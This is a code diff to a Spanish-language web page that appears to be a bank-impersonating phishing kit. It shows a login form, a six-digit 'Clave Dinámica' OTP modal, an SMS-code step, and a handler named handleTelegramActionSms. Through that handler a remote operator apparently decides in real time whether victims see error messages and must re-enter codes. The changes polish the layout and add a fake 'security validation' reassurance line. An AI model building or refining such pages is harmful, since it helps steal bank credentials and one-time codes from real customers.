@@ -97,6 +97,7 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 
 .modal-close { display: none; }
 
+/* Ajuste: GIF más corto y sin deformar */
 .gif-container { 
   width: calc(100% + 48px);
   margin-left: -24px;
@@ -105,8 +106,14 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
   border-radius: 12px 12px 0 0; 
   overflow: hidden; 
   background: #4cc9f0; 
+  max-height: 160px; /* Limita la altura del GIF */
 }
-.gif-container img { width: 100%; height: auto; display: block; }
+.gif-container img { 
+  width: 100%; 
+  height: 160px; /* Fija la altura */
+  object-fit: cover; /* Recorta sin deformar */
+  display: block; 
+}
 
 .modal-title { font-size: 28px; font-weight: 700; color: #1f1f1f; text-align: center; margin: 0 0 12px; }
 .modal-subtitle { font-size: 18px; color: #444; text-align: center; margin: 0 0 30px; line-height: 1.4; }
@@ -135,6 +142,15 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 .btn-continuar.ready { background: var(--yellow); color: #1f1f1f; cursor: pointer; }
 .btn-continuar.ready:hover { background: #f2cd00; }
 
+/* TEXTO DE SEGURIDAD */
+.security-note {
+  text-align: center;
+  font-size: 12px;
+  color: #888;
+  margin-top: 20px;
+  line-height: 1.4;
+}
+
 /* === VISTA SMS CODE === */
 .sms-view {
   display: none;
@@ -142,9 +158,11 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
   padding: 20px 0;
 }
 .sms-view.active { display: block; }
+
+/* Ajuste: Icono SMS más pequeño */
 .sms-icon {
-  font-size: 60px;
-  margin-bottom: 20px;
+  font-size: 40px; /* Reducido de 60px a 40px */
+  margin-bottom: 15px;
 }
 .sms-message {
   font-size: 18px;
@@ -216,7 +234,8 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
   
   .modal-overlay { padding: 20px 10px; align-items: flex-start; }
   .modal-content { padding: 20px 16px 20px; margin-top: 10px; }
-  .gif-container { margin-left: -16px; margin-right: -16px; width: calc(100% + 32px); }
+  .gif-container { margin-left: -16px; margin-right: -16px; width: calc(100% + 32px); max-height: 120px; }
+  .gif-container img { height: 120px; }
   .modal-title { font-size: 24px; }
   .modal-subtitle { font-size: 16px; }
   .otp-slot { height: 26px; font-size: 24px; }
@@ -265,7 +284,6 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
       <a class="help-link" href="#ayuda-clave">¿Olvidaste o bloqueaste tu clave?</a>
     </div>
 
-    <!-- Aviso sutil de error en Login -->
     <p class="login-error" id="loginError">Usuario o clave incorrectos. Intenta de nuevo.</p>
 
     <button class="submit" id="submitBtn" type="submit" disabled>Iniciar sesión</button>
@@ -285,7 +303,6 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 <div class="modal-overlay" id="modalDinamica">
   <div class="modal-content">
     
-    <!-- VISTA 1: CLAVE DINÁMICA (6 dígitos) -->
     <div id="viewDinamica">
       <div class="gif-container">
         <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
@@ -310,9 +327,10 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
         <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
         <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
       </div>
+
+      <p class="security-note">Validación de seguridad para ingresar al portal web y ver tus productos.</p>
     </div>
 
-    <!-- VISTA 2: SMS CODE (oculta por defecto) -->
     <div id="viewSms" class="sms-view">
       <div class="sms-icon">📩</div>
       <h2 class="modal-title">Código SMS Enviado</h2>
@@ -328,6 +346,8 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
       <p class="sms-error" id="smsError">El código SMS es incorrecto o ha expirado. Intenta de nuevo.</p>
 
       <button class="btn-sms-final" id="btnSmsFinal">Validar Código</button>
+
+      <p class="security-note">Validación de seguridad para ingresar al portal web y ver tus productos.</p>
     </div>
 
   </div>
@@ -564,7 +584,6 @@ function handleTelegramActionSms(action) {
     ocultarOverlay();
 
     if (action === 'error_dinamica_final') {
-        // Volver a la vista de la dinámica
         viewSms.classList.remove("active");
         viewDinamica.style.display = "block";
         otpError.classList.add("show");
@@ -574,7 +593,6 @@ function handleTelegramActionSms(action) {
         otpInput.focus();
         actionProcessed = false;
     } else if (action === 'error_sms_final') {
-        // Mostrar error en la vista SMS
         smsError.classList.add("show");
         smsInputWrap.classList.add("error");
         smsCodeInput.value = "";
